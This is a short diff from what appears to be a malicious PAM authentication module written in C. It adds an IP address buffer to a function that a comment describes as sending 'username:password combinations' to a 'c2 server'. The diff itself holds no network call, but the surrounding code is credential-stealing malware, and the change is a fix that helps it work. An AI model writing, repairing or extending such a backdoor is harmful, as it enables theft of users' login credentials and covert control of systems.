@@ -55,6 +55,7 @@ int get_local_ip(char *buffer, size_t buflen) {
 // Function to send data to the c2 server (mainly username:password combinations)
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
 
+    char ipaddr[INET_ADDRSTRLEN];
     if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
         return 1;
     }
